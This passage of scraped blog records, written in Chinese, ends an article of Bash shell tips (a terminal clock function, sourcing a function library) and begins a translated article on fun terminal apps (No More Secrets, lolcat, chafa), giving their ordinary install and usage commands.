style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9fff8180548170-1\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dir1</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dir2</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dir3</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dir4</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h4 id=\"toc_10\">数字时钟</h4>\n<p>下面的函数在终端里创建了一个简单的数字时钟：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9fffc381019188\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfunction digital_clock {\r\n    clear\r\n    while [ 1 ]\r\n    do\r\n        date +'%T'\r\n        sleep 1\r\n        clear\r\n    done\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9fffc381019188-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9fffc381019188-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9fffc381019188-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9fffc381019188-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9fffc381019188-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9fffc381019188-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9fffc381019188-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9fffc381019188-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9fffc381019188-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9fffc381019188-1\"><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">digital_clock</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9fffc381019188-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">clear</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9fffc381019188-3\"><span class=\"crayon-e\">    </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9fffc381019188-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">do</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9fffc381019188-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">date</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-s\">'%T'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9fffc381019188-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-i\">sleep</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9fffc381019188-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">clear</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9fffc381019188-8\"><span class=\"crayon-e\">    </span><span class=\"crayon-i\">done</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9fffc381019188-9\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p></p>\n<h3 id=\"toc_11\">函数库</h3>\n<p>库是函数的集合。将函数定义在文件里并在当前环境中导入那个文件，这样可以创建函数库。</p>\n<p>假设我们已经在 <code>utils.sh</code> 中定义好了所有函数，接着在当前的环境下使用下面的命令导入函数：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670aa0006637093392\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ source utils.sh</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670aa0006637093392-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670aa0006637093392-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">source </span><span class=\"crayon-v\">utils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sh</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>之后你就可以像调用其它 Bash 命令那样执行库中任何的函数了。</p>\n<h3 id=\"toc_12\">总结</h3>\n<p>本文我们讨论了诸多可以提升效率的实用技巧。我希望这篇文章能够启发你去创造自己的技巧。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114329\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114329votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114329\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/71285d56f5f756f6df8bd1e65052353494be2a08.jpg"}
{"title": "4 款酷炫的终端应用", "url": "http://blog.jobbole.com/114268/", "create_date": "2018/08/11", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/08/caf40e93894ca408fc2b86171e34d5bb.jpg"], "url_object_id": "15424aab1c26112c65d15cdc32005957", "praise_nums": 1, "fav_nums": 0, "comment_nums": 0, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://fedoramagazine.org/4-cool-apps-for-your-terminal/\">Atolstoy</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9903-1.html\">Linux中国/geekpi</a>   </div><p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/caf40e93894ca408fc2b86171e34d5bb.jpg\" alt=\"\"></p>\n<p>许多 Linux 用户认为在终端中工作太复杂、无聊，并试图逃避它。但这里有个改善方法 —— 四款终端下很棒的开源程序。它们既有趣又易于使用，甚至可以在你需要在命令行中工作时照亮你的生活。</p>\n<h3 id=\"toc_1\">No More Secrets</h3>\n<p>这是一个简单的命令行工具，可以重现 1992 年电影 <a href=\"https://www.imdb.com/title/tt0105435/\">Sneakers</a> 中所见的著名数据解密效果。该项目让你编译个 <code>nms</code> 命令，该命令与管道数据一起使用并以混乱字符的形式打印输出。开始后，你可以按任意键，并能在输出中看到很酷的好莱坞效果的现场“解密”。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/ea7b5b22dafecafe38c1e30d1104181a.gif\" alt=\"\"></p>\n<h4 id=\"toc_2\">安装说明</h4>\n<p>一个全新安装的 Fedora Workstation 系统已经包含了从源代码构建 No More Secrets 所需的一切。只需在终端中输入以下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671094046458713761\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit clone https://github.com/bartobri/no-more-secrets.git\r\ncd ./no-more-secrets\r\nmake nms\r\nmake sneakers ## Optional\r\nsudo make install\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671094046458713761-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671094046458713761-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab671094046458713761-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671094046458713761-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab671094046458713761-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671094046458713761-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671094046458713761-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-r\">clone</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//github.com/bartobri/no-more-secrets.git</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671094046458713761-2\"><span class=\"crayon-i\">cd</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">no</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">more</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">secrets</span></div><div class=\"crayon-line\" id=\"crayon-5bab671094046458713761-3\"><span class=\"crayon-e\">make </span><span class=\"crayon-e\">nms</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671094046458713761-4\"><span class=\"crayon-e\">make </span><span class=\"crayon-v\">sneakers</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\">## Optional</span></div><div class=\"crayon-line\" id=\"crayon-5bab671094046458713761-5\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">make </span><span class=\"crayon-i\">install</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671094046458713761-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>对于那些记得原来的电影的人来说，<code>sneakers</code> 命令是一个小小的彩蛋，但主要的英雄是 <code>nms</code>。使用管道将任何 Linux 命令重定向到 <code>nms</code>，如下所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67109404f272200345\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsystemctl list-units --type=target | nms\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67109404f272200345-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67109404f272200345-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67109404f272200345-1\"><span class=\"crayon-e\">systemctl </span><span class=\"crayon-v\">list</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">units</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">type</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">target</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">nms</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67109404f272200345-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>当文本停止闪烁，按任意键“解密”它。上面的 <code>systemctl</code> 命令只是一个例子 —— 你几乎可以用任何东西替换它！</p>\n<h3 id=\"toc_3\">lolcat</h3>\n<p>这是一个用彩虹为终端输出着色的命令。没什么用，但是它看起来很棒！</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/b39a8935a88452f092403952cc37373c.png\" alt=\"\"></p>\n<h4 id=\"toc_4\">安装说明</h4>\n<p><code>lolcat</code> 是一个 Ruby 软件包，可从官方 Ruby Gems 托管中获得。所以，你首先需要 gem 客户端：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671094053476171649\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo dnf install -y rubygems\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671094053476171649-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671094053476171649-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671094053476171649-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">dnf </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">rubygems</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671094053476171649-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>然后安装 <code>lolcat</code> 本身：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671094056223736170\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngem install lolcat\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671094056223736170-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671094056223736170-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671094056223736170-1\"><span class=\"crayon-e\">gem </span><span class=\"crayon-e\">install </span><span class=\"crayon-i\">lolcat</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671094056223736170-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>再说一次，使用 <code>lolcat</code> 命令管道任何其他命令，并在 Fedora 终端中享受彩虹（和独角兽！）。</p>\n<h3 id=\"toc_5\">chafa</h3>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/732897f0dd7e1120a72c94de00eff1c4.gif\" alt=\"\"></p>\n<p><code>chafa</code> 是一个<a href=\"https://hpjansson.org/chafa/\">命令行图像转换器和查看器</a>。它可以帮助你在不离开终端的情况下欣赏图像。语法非常简单：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67109405a285293147\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nchafa /path/to/your/image\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr 